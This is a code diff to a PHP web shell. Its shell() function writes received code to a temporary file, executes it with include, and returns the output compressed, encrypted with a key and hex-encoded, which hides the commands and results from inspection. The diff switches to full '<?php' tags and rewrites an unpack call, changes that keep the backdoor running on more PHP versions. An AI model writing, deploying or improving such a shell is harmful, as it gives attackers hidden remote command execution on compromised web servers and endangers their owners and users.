@@ -1,4 +1,4 @@
-<?
+<?php 
 function encrypt($key,$str){
 	$isempty=empty($str)||@gzuncompress($str)==='';
 	for($ii=0;$ii<strlen($key);$ii++){
@@ -25,7 +25,8 @@ function shell() {
 	$tmp=tempnam(null,null);
 	file_put_contents($tmp,'<?php '.$mod.$cmd.' ?>');
 	try{ include($tmp); }catch(Exception $e){}
-	echo unpack('H*',encrypt($key,@gzcompress(@ob_get_clean(),9)))[1];
+	$r=unpack('H*',encrypt($key,@gzcompress(@ob_get_clean(),9)));
+	echo $r[1];
 }
 shell();
 ?>
